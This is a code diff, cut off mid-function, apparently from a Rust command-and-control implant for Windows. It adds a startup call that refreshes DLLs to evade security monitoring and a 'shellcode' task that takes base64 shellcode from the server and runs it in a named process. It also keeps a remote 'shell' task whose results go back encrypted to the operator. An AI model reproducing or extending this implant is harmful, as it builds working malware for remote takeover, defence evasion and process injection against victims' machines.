@@ -11,6 +11,7 @@ use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};
 
 use crate::{
     core::{
+        evasion::win::dll::refresh_dlls,
         handlers::win::{
             async_handler::HRequestAsync,
             handler::{HConnect, HInternet, HRequest, HSession},
@@ -19,7 +20,10 @@ use crate::{
         systeminfo::systeminfo_windows::get_computer_name,
         tasks::{
             screenshot::screenshot,
-            win::shell::shell,
+            win::{
+                shell::shell,
+                shellcode::shellcode,
+            },
         },
     },
     Config,
@@ -28,6 +32,10 @@ use crate::{
 };
 
 pub async fn run(config: Config) -> Result<(), Error> {
+    if let Err(e) = refresh_dlls() {
+        println!("Error refreshing DLLs {:?}", e);
+    }
+
     let user_agent = HSTRING::from(config.listener.user_agent.to_string());
 
     let hsession = HSession::new(user_agent)?;
@@ -419,6 +427,31 @@ pub async fn run(config: Config) -> Result<(), Error> {
             }
             "shell" => {
                 match shell(task_args[1..].join(" ")).await {
+                    Ok(result) => {
+                        post_task_result(
+                            &mut hconnect,
+                            &result,
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+            }
+            "shellcode" => {
+                let process_name = task_args[1].to_string();
+                let shellcode_b64 = task_args[2].to_string();
+
+                match shellcode(process_name, shellcode_b64) {
                     Ok(result) => {
                         post_task_result(
                             &mut hconnect,
